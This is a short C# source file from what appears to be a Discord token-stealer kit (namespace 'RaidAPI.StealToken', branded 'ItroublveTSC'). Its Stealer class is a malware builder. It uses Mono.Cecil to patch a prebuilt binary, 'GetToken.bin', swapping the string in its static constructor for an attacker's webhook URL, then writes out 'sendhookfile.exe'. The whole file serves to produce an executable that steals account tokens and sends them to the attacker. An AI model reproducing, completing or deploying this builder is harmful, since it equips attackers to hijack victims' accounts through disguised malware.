using System;
using System.Linq;
using System.Windows.Forms;
using Mono.Cecil;
using Mono.Cecil.Cil;

namespace RaidAPI.StealToken
{
	public static class Stealer
	{
		public static void Dialog(string _Hook)
		{
			string output = "output/sendhookfile.exe";
			Stealer.CreateExe(_Hook, output);
		}

		internal static void CreateExe(string _Hook, string _Output)
		{
			try
			{
				AssemblyDefinition assemblyDefinition = AssemblyDefinition.ReadAssembly("GetToken.bin");
				foreach (Instruction instruction in assemblyDefinition.MainModule.Types.First((TypeDefinition ty) => ty.FullName == "StealerBin.API").Methods.First((MethodDefinition me) => me.Name == ".cctor").Body.Instructions)
				{
					if (instruction.OpCode == OpCodes.Ldstr)
					{
						instruction.Operand = _Hook;
						break;
					}
				}
				assemblyDefinition.Write(_Output);
			}
			catch
			{
				MessageBox.Show("Cant create .exe\r\nGetToken.bin was modified or removed.", "ItroublveTSC");
			}
		}
	}
}
